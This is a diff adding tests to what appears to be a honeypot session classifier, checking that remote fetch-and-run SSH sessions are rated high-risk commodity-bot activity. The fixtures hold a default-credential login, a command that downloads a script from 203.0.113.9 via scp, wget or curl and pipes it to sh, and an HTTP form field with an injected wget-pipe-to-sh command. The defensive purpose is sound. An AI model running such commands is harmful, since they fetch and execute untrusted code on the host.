@@ -263,3 +263,55 @@ def test_repeat_connections_at_four_does_not_match():
     summary = classify_session(session, connection_count_from_same_ip=4)
 
     assert "repeat_connections_same_ip" not in summary.matched_rule_ids
+
+
+def test_ssh_remote_payload_fetch_and_run_is_high_risk_commodity_bot():
+    """A logged-in session that downloads a program and runs it must not be
+    rated the same as a password guess: it still matches
+    authentication_attempt, but the combined score has to land in "high"."""
+    session = make_session(
+        "tcp_shell",
+        [
+            ("login: root", 0.0),
+            ("password: admin", 0.0),
+            (
+                "uname -a; cd /tmp; scp -F sshcfg -i key.ppk dlr@203.0.113.9:sh out_sh; "
+                "if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh; "
+                "else (wget -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s ssh; fi",
+                2.0,
+            ),
+        ],
+        duration_seconds=2.7,
+    )
+
+    summary = classify_session(session)
+
+    assert "ssh_remote_payload_fetch_and_run" in summary.matched_rule_ids
+    assert "authentication_attempt" in summary.matched_rule_ids
+    assert summary.actor_label == "commodity_bot"
+    assert "T1105" in summary.mitre_tags
+    assert summary.risk_level == "high"
+
+
+def test_ssh_login_followed_by_a_harmless_command_does_not_match_fetch_and_run():
+    session = make_session(
+        "tcp_shell",
+        [("login: root", 0.0), ("password: admin", 0.0), ('echo -e "\\x6F\\x6B"', 1.0)],
+        duration_seconds=1.5,
+    )
+
+    summary = classify_session(session)
+
+    assert "ssh_remote_payload_fetch_and_run" not in summary.matched_rule_ids
+
+
+def test_fetch_and_run_text_over_http_does_not_match_the_ssh_rule():
+    session = make_session(
+        "http",
+        [("POST /goform/set_LimitClient_cfg: x=1;wget http://203.0.113.9/a -O-|sh", 0.0)],
+        duration_seconds=0.1,
+    )
+
+    summary = classify_session(session)
+
+    assert "ssh_remote_payload_fetch_and_run" not in summary.matched_rule_ids
